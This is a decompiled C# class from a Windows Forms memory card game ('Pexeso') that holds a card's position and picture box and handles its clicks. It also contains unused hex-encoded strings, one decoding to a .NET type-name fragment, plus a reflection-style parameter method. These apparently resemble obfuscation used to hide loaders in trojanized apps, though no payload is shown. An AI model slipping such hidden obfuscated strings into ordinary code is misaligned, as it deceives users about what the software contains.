using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Pexeso.My;

namespace Pexeso;

public class ClassPictures
{
	public int X;

	public int Y;

	[field: AccessedThroughProperty("PictureBoxCard")]
	public virtual PictureBox PictureBoxCard
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public static string ParamXGroup => "52756E74696D65417267756D656E7448616E64";

	public static string ParamXArray => "505A417A4C7246";

	public ClassPictures(int X, int Y, PictureBox PictureBoxCard)
	{
		this.X = X;
		this.Y = Y;
		this.PictureBoxCard = PictureBoxCard;
	}

	public void PictureBoxCard_MouseClick(object sender, MouseEventArgs e)
	{
		MyProject.Forms.frmGameplay.CardHandler(X, Y);
	}

	public static object ParamF()
	{
		return new object[3];
	}
}
